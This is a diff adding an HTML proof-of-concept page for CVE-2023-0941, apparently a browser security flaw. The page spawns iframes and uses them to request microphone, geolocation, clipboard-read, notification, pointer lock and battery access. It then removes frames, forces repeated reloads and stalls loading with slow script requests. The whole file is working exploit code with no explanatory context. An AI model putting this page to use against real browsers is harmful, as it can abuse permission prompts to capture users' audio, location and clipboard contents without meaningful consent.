@@ -1,0 +1,164 @@
+<html>
+<head>
+	<title>312552025 CVE-2023-0941 POC HTML</title>
+	<!--
+	<h1>312552025</h1>
+	<p>CVE-2023-0941 Proof of Concept HTML</p>
+	-->
+  	<!-- <body></body> can not work with frameset -->
+</head>
+
+<body>
+  <script>
+  	//Microphone can be put at first?
+
+  	var permissions = new Array(6);
+    permissions[2] = "Geolocation";
+    permissions[1] = "Microphone";
+    permissions[0] = "Notification";
+    permissions[3] = "Clipboard";
+    //permissions[4] = "FullScreen";
+    permissions[4] = "PointerLock";
+    permissions[5] = "Battery";
+
+    var iframe = new Array(6);
+    var iframe_ptr = new Array(6);
+
+    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    function createIframe(src, width, height) {
+		var iframe = document.createElement("iframe");
+		iframe.src = src;
+		iframe.width = width;
+		iframe.height = height;
+		document.body.appendChild(iframe);
+		return iframe;
+    }
+
+    function requestNotificationPermission(iframe_ptr_req) {
+     	iframe_ptr_req.Notification.requestPermission().then(function(permission){
+        	console.log('Notification permission:', permission);
+      	});
+    }
+
+    function requestMicrophonePermission(iframe_ptr_req) {
+    	iframe_ptr_req.navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+            console.log('Microphone access granted');
+              // Do something with the stream if needed
+        })
+        	.catch(function (error) {
+          	console.error('Error accessing microphone:', error);
+        });
+    }
+
+    function requestGeoPermission(iframe_ptr_req){
+    	iframe_ptr_req.navigator.geolocation.getCurrentPosition(function(position){
+	        console.log('Geolocation permission granted:', position);
+	    },function (error){
+	        console.error('Geolocation permission denied:', error);
+	    });
+    }
+
+    function requestClipboardPermission(iframe_ptr_req){
+    	iframe_ptr_req.focus();
+		iframe_ptr_req.navigator.clipboard.readText().then(function(text){
+            console.log('Clipboard permission granted:', text);
+        },function (error){
+            console.error('Clipboard permission denied:', error);
+        });
+    }
+
+    function requestFullScreenPermission(iframe_ptr_req){
+    	iframe_ptr_req.document.documentElement.requestFullscreen();
+    }
+
+    function requestPtrLockPermission(iframe_ptr_req){
+    	iframe_ptr_req.document.body.requestPointerLock();
+    }
+
+    function requestBatteryPermission(iframe_ptr_req){
+    	iframe_ptr_req.navigator.getBattery().then(function(battery){
+            console.log('Battery status:', battery.level * 100 + '%');
+          },function (error) {
+            console.error('Error occurred while getting battery status:', error);
+          }
+        );
+    }
+
+    function requestPermission(iframe_ptr_req, permission_request){
+    	switch(permission_request){
+    		case 'Microphone':
+    			requestMicrophonePermission(iframe_ptr_req);
+    			//iframe_ptr_req.navigator.mediaDevices.getUserMedia({ audio: true });
+    			break;
+    		case 'Geolocation':
+    			requestGeoPermission(iframe_ptr_req);
+    			//iframe_ptr_req.navigator.geolocation.getCurrentPosition(console.log);
+    			break;
+    		case 'Notification':
+    			requestNotificationPermission(iframe_ptr_req);
+    			//iframe_ptr_req.Notification.requestPermission();
+    			break;
+    		case 'Clipboard':
+    			requestClipboardPermission(iframe_ptr_req);
+    			//iframe_ptr_req.focus();
+				//iframe_ptr_req.navigator.clipboard.readText();
+    			break;
+    		// Full Screen can only be requested by user
+    		/*case 'FullScreen':
+    			requestFullScreenPermission(iframe_ptr_req);
+    			break;*/
+    		case 'PointerLock':
+    			requestPtrLockPermission(iframe_ptr_req);
+    			break;
+    		case 'Battery':
+    			requestBatteryPermission(iframe_ptr_req);
+    			break;
+    	}
+    }
+
+    async function delayReload(){
+    	await delay(6000);
+    	window.location.reload();
+    }
+
+	async function delayedExecution() {
+	    await delay(1200); // Delay in milliseconds
+
+	    for(var count = 0; count < 6; count++){
+	        iframe_ptr[count] = iframe[count].contentWindow;
+	    }
+	    for(var count = 0; count < 6; count++){
+	        // Use a closure to capture the current value of count
+	        /*iframe_ptr[count].onload = (function (iframe_ptr[count], currentCount) {
+	          return function () {
+	            requestPermission(iframe[count], permissions[currentCount]);
+	          };
+	        })(iframe_ptr[count], count);*/
+	    	requestPermission(iframe_ptr[count], permissions[count]);
+	    }
+
+	    // set to 3 -> not work
+	   	for(var count = 0; count < 2; count++){
+	   		    iframe[count].remove();
+	   	}
+
+	   	delayReload();
+	}
+
+    for(var count = 0; count < 6; count++){
+        // Create iframes and request permissions
+        iframe[count] = createIframe("notification.html", 300, 200);
+    }
+
+    delayedExecution();
+    
+
+  </script>
+</body>
+
+<!--Ask the server to provide file later, this allow browser to fully load everything properly-->
+<script src="?slow_server_response"></script>
+
+<script src="?slow_server_response"></script>
+</html>
